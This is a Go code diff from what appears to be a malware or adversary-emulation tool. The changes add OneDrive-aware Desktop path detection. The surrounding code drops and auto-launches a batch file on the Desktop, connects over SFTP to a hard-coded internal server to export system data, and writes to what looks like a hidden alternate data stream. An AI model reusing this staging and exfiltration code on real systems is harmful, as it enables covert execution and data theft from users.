@@ -59,14 +59,34 @@ func setupFakeEnv() {
 	if err != nil {
 		fmt.Println(err)
 	}
+
+	desktop := OneDriveCheck()
 	// Create Batch File
 	batFile, err := Startup3751243Resource()
-	bat, err := os.Create(usrDir + "\\Desktop\\startup3751243.bat")
+	bat, err := os.Create(usrDir + desktop + "startup3751243.bat")
 	bat.Write(batFile)
 	bat.Close()
 	if err != nil {
 		fmt.Println(err)
 	}
+}
+
+// OneDriveCheck finds if the system has Onedrive enabled and changes desktop locaiton accordingly
+func OneDriveCheck() string {
+	var desktopLocation string
+
+	usrDir := getUserHomeDir()
+
+	fmt.Println(usrDir)
+
+	if _, err := os.Stat(usrDir + "\\Desktop\\"); err != nil {
+		if os.IsNotExist(err) {
+			desktopLocation += "\\OneDrive"
+		}
+	}
+	desktopLocation += "\\Desktop\\"
+
+	return desktopLocation
 }
 
 func saveAllInfo() {
@@ -132,7 +152,7 @@ func syncWithSFTP() {
 
 	// Connect to SFTP Server
 	cfg.SetDefaults()
-	connect, err := ssh.Dial("tcp", "10.0.0.33:22", cfg)
+	connect, err := ssh.Dial("tcp", "10.0.0.32:22", cfg)
 	if err != nil {
 	}
 	defer connect.Close()
@@ -159,8 +179,9 @@ func syncWithSFTP() {
 	// Export System Data
 	//	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
 
+	desktop := OneDriveCheck()
 	srcPath := ""
-	dstPath := (usrDir + "\\Desktop\\startup3751243.bat:")
+	dstPath := (usrDir + desktop + "startup3751243.bat:")
 	filename := "bannana.html"
 
 	// Open the source file
@@ -279,6 +300,7 @@ func getUserHomeDir() string {
 func over() {
 	time.Sleep(5 * time.Second)
 	usrDir := getUserHomeDir()
-	cmd := exec.Command("cmd", "/C", "start", (usrDir + "\\Desktop\\startup3751243.bat"))
+	desktop := OneDriveCheck()
+	cmd := exec.Command("cmd", "/C", "start", (usrDir + desktop + "startup3751243.bat"))
 	cmd.Start()
 }
